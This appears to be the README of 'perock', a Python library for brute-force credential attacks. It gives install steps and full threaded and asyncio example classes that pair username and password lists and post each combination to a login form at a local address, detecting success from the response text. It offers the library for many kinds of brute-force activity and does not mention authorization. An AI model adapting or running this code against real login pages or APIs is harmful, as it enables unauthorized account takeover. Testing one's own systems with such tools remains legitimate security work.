# perock
> Simple Python bruteforce attack library

### Description
Perock is Python bruteforce attack library built on threads and asyncio. Its
intended for simplifying bruteforce attack by performing common tasks in
bruteforce such as calculating cartesian product.

Perock was built to be general purpose in that it can be used for wide 
variety of bruteforce attack activities. It can be used with html forms,
file with passwords, API requiring username and password, etc.

All it takes is defining how to interact with the system/target and validate
bruteforce data such as username and password. The rest will be handled you
including when to terminate based on certain conditions which would
save improve performance.

#### Pros
- Simple and easy to get started.
- Supports concurrency with asycio and threads.
- Performs faster with optmisations.
- General purpose(almost any bruteforce attack activity)
- Bruteforce data can be loaded from csv and json files.

#### Cons
- Performs slower than manually written code.
- Not as fast with CPU bound attack(e.g cracking password file)

### Install
In your command-line application enter this:
```bash 
pip install perock
```

### Examples

#### Import neccessay modules
```python
from perock import forcetable
from perock import attack
from perock import runner

import requests
import aiohttp
```

#### Setup bruteforce data
```python
# Create field with usernames
usernames_field = forcetable.FieldFile("usernames", "usernames.txt")
usernames_field.set_item_name("username")

# Create with passwords
passwords_field = forcetable.FieldFile("passwords", "passwords.txt")
passwords_field.set_item_name("password")

# Create table and add fields
table = forcetable.Table()
table.add_field(usernames_field)
table.add_field(passwords_field)
# Sets usernames_field as primary field of table
table.set_primary_field(usernames_field)

# table will handle cartesian product of the fields
# tabe also contains records created from the fields
```

#### Threaded bruteforce attack
```python
class LoginPageAttack(attack.Attack):
    def __init__(self, target, data: dict, retries=1) -> None:
        super().__init__(target, data, retries)
        # self._responce can also be None or Exception
        # Responce can be anything but None and Exception are special.
        self._responce: requests.Response

    @classmethod
    def create_session(cls):
        # Creates session object to use with requests
        # That can improve request performance
        return requests.Session()

    def request(self):
        # Performs request with target and return responce
        if self.session_exists():
            session = self.get_session()
            return session.post(self._target, data=self._data)
        else:
            return requests.post(self._target, data=self._data)
            

    def failure(self):
        # Tests if attempt failed or not
        if self.target_reached():
            if b"Failed to login" in self._responce.content:
                return True
            elif b"No such username" in self._responce.content:
                return True
        return False

    def success(self):
        # Tests if attempt failed or not
        if self.target_reached():
            return b"Login successful" in self._responce.content
        return False

    def target_errors(self):
        if self.target_reached():
            return self._responce.status_code != 200
        return False

# Creates runner object to perform bruteforce
runner_object = runner.Runner(LoginPageAttack)
runner_object.set_target('http://127.0.0.1:5000/login')
runner_object.set_table(table)

# Enables optimisation(requires primary field)
runner_object.enable_optimise()
runner_object.run()
```

#### Asynchronous bruteforce attack
```python
class LoginPageAttackAsync(attack.AttackAsync):
    def __init__(self, target, data: dict, retries=1) -> None:
        super().__init__(target, data, retries)
        # self._responce can also be None or Exception
        # Responce can be anything but None and Exception are special.
        self._responce: aiohttp.ClientResponse
        self._session: aiohttp.ClientSession

    @classmethod
    async def create_session(cls):
        # Creates session object to use with request
        return aiohttp.ClientSession()

    async def request(self):
        if self.session_exists():
            return await self._session.post(self._target, data=self._data)
        else:
            async with self.create_session() as session:
                return await session.post(self._target, data=self._data)

    async def failure(self):
        if await self.target_reached():
            if b"Failed to login" in await self._responce.read():
                return True
            elif b"No such username" in await self._responce.read():
                return True
        return False

    async def success(self):
        if await self.target_reached():
            return b"Login successful" in await self._responce.read()
        return False

    async def target_errors(self):
        if await self.target_reached():
            return self._responce.status != 200
        return False


# Creates runner object to perform bruteforce
runner_object = runner.RunnerAsync(LoginPageAttackAsync)
runner_object.set_target('http://127.0.0.1:5000/login')
runner_object.set_table(table)

# Enables optimisation(requires primary field)
runner_object.enable_optimise()
asyncio.run(runner_object.run())
```
